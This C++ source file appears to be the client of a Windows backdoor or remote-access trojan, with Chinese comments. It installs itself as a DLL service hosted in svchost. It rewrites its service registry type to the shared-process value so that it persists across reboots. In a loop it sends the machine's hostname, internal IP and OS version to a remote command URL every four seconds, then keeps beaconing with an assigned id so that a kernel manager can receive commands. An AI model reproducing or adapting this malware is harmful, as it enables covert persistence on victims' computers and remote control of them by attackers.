#include "Client.h"
#include "KernelManager.h"

#include <stdio.h>
//#include "Map.h"

#pragma comment (lib,"ws2_32.lib")


extern "C" __declspec(dllexport) void ServiceMain(int argc, wchar_t* argv[]);

int TellSCM( DWORD dwState, DWORD dwExitCode, DWORD dwProgress );
void __stdcall ServiceHandler(DWORD dwControl);
void ReConfigService(char *lpServiceName);
DWORD WINAPI login(char *lpServiceName);

SERVICE_STATUS_HANDLE hServiceStatus;
DWORD	g_dwCurrState;
DWORD	g_dwServiceType;
char	svcname[MAX_PATH];


void PostLoginInfo(CClient* pclient)
{
	WSADATA WSAData;
	WSAStartup(MAKEWORD(2,2),&WSAData);

	char name[1024];
	char strIp[32];
	char strSystem[32];
	

	
	PHOSTENT pHost;
	gethostname(name,sizeof(name));
	pHost = gethostbyname(name);
	sprintf(strIp,"%s",inet_ntoa(*(struct in_addr *)*pHost->h_addr_list));  //获取内网IP

	OSVERSIONINFO os;
	os.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	if(GetVersionEx(&os) ==0)
	{	
		return ;
	}
	if(os.dwMajorVersion == 6 )
	{
		sprintf(strSystem,"%s","Windows7");

	}

	if(os.dwMajorVersion == 5 && os.dwMinorVersion ==2)
	{
		sprintf(strSystem,"%s","Windows 2003");

	}

	if(os.dwMajorVersion == 5 && os.dwMinorVersion == 1)
	{
		sprintf(strSystem,"%s","Windows XP");

	}

	if(os.dwMajorVersion == 5 && os.dwMinorVersion ==0)
	{
		sprintf(strSystem,"%s","Windows 2000");

	}

	if(os.dwMajorVersion <= 4 )
	{
		sprintf(strSystem,"%s","Windows NT");

	}
	char* strVer="1";
	
	char* strId="";
	
	char PostData[1024];
	sprintf(PostData,"ver=%s&id=%s&name=%s&ip=%s&system=%s",strVer,strId,name,strIp,strSystem);

	pclient->post(DestUrl,PostData);
}

DWORD WINAPI login(char *lpServiceName)
{   
	char	strServiceName[256];
	if(lpServiceName!=NULL)
	{
		lstrcpy(strServiceName, lpServiceName);
		ReConfigService(strServiceName);
	}
	CClient  pClient;
	CKernelManager manager(&pClient,strServiceName);
	pClient.setManagerCallBack(&manager);

	while(!manager.b_quit)
	{
		if (!manager.b_signed)
		{
			PostLoginInfo(&pClient);
		}
		
		else
		{   
			char* strVer="1";
			char PostData[10];
			sprintf(PostData,"ver=%s&id=%03d",strVer,manager.m_id);
			
			pClient.post(DestUrl,PostData);
		}
		Sleep(4000);
	}
	return 0;
}

void main()
{
	//getchar();
	CreateThread(NULL,0,(LPTHREAD_START_ROUTINE)login,NULL,0,NULL);
	while (1) Sleep(10000);

}
void ReConfigService(char *lpServiceName)
{
	int rc = 0;
	HKEY hKey = 0;

	try{
		char buff[500];
		//config service
		strncpy(buff, "SYSTEM\\CurrentControlSet\\Services\\", sizeof buff);
		strcat(buff, lpServiceName);
		rc = RegCreateKey(HKEY_LOCAL_MACHINE, buff, &hKey);
		if(ERROR_SUCCESS != rc)
		{
			throw "";
		}
		// 进程为Owner的，改为Share,这样关机了才会自启动！！！！！！！！！！！！
		DWORD dwType = 0x120;
		rc = RegSetValueEx(hKey, "Type", 0, REG_DWORD, (unsigned char*)&dwType, sizeof(DWORD));
		SetLastError(rc);
		if(ERROR_SUCCESS != rc)
			throw "RegSetValueEx(start)";
	}
	catch(char *str)
	{
		if(str && str[0])
		{
			rc = GetLastError();
		}
	}

	RegCloseKey(hKey);
}

BOOL APIENTRY DllMain( HANDLE hModule,
					  DWORD  ul_reason_for_call,
					  LPVOID lpReserved
					  )
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:	
	case DLL_THREAD_ATTACH:
		printf("dll main\n");
		break;
	case DLL_PROCESS_DETACH:
		break;
	}

	return TRUE;
}


DWORD QueryServiceTypeFromRegedit(char *lpServiceName)
{
	int rc = 0;
	HKEY hKey = 0;
	DWORD	dwServiceType = 0;
	try{
		char buff[500];
		//config service
		strncpy(buff, "SYSTEM\\CurrentControlSet\\Services\\", sizeof buff);
		strcat(buff, lpServiceName);
		rc = RegOpenKey(HKEY_LOCAL_MACHINE, buff, &hKey);
		if(ERROR_SUCCESS != rc)
		{
			throw "";
		}

		DWORD type, size = sizeof(DWORD);
		rc = RegQueryValueEx(hKey, "Type", 0, &type, (unsigned char *)&dwServiceType, &size);
		RegCloseKey(hKey);
		SetLastError(rc);
		if(ERROR_SUCCESS != rc)
			throw "RegQueryValueEx(Type)";
	}
	catch(...)
	{
	}

	RegCloseKey(hKey);
	return dwServiceType;
}


extern "C" __declspec(dllexport) void ServiceMain( int argc, wchar_t* argv[] )
{
	strncpy(svcname, (char*)argv[0], sizeof svcname); //it's should be unicode, but if it's ansi we do it well
	wcstombs(svcname, argv[0], sizeof svcname);
	hServiceStatus = RegisterServiceCtrlHandler(svcname, (LPHANDLER_FUNCTION)ServiceHandler);
	if( hServiceStatus == NULL )
	{
		return;
	}else 
		FreeConsole();

	TellSCM( SERVICE_START_PENDING, 0, 1 );
	TellSCM( SERVICE_RUNNING, 0, 0);
	// call Real Service function noew

	g_dwServiceType = QueryServiceTypeFromRegedit(svcname);
	HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)login,(LPVOID)svcname, 0, NULL);
	do{
		Sleep(100);//not quit until receive stop command, otherwise the service will stop
	} while(g_dwCurrState != SERVICE_STOP_PENDING && g_dwCurrState != SERVICE_STOPPED);
	
	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);

	if (g_dwServiceType == 0x120)
	{
		//Shared的服务 ServiceMain 不退出，不然一些系统上svchost进程也会退出
		while (1) Sleep(10000);
	}
	return;
}
int TellSCM( DWORD dwState, DWORD dwExitCode, DWORD dwProgress )
{
	SERVICE_STATUS srvStatus;
	srvStatus.dwServiceType = SERVICE_WIN32_SHARE_PROCESS;
	srvStatus.dwCurrentState = g_dwCurrState = dwState;
	srvStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
	srvStatus.dwWin32ExitCode = dwExitCode;
	srvStatus.dwServiceSpecificExitCode = 0;
	srvStatus.dwCheckPoint = dwProgress;
	srvStatus.dwWaitHint = 1000;
	return SetServiceStatus( hServiceStatus, &srvStatus );
}

void __stdcall ServiceHandler(DWORD    dwControl)
{
	// not really necessary because the service stops quickly
	switch( dwControl )
	{
	case SERVICE_CONTROL_STOP:
		TellSCM( SERVICE_STOP_PENDING, 0, 1 );
		Sleep(10);
		TellSCM( SERVICE_STOPPED, 0, 0 );
		break;
	case SERVICE_CONTROL_PAUSE:
		TellSCM( SERVICE_PAUSE_PENDING, 0, 1 );
		TellSCM( SERVICE_PAUSED, 0, 0 );
		break;
	case SERVICE_CONTROL_CONTINUE:
		TellSCM( SERVICE_CONTINUE_PENDING, 0, 1 );
		TellSCM( SERVICE_RUNNING, 0, 0 );
		break;
	case SERVICE_CONTROL_INTERROGATE:
		TellSCM( g_dwCurrState, 0, 0 );
		break;
	}
}
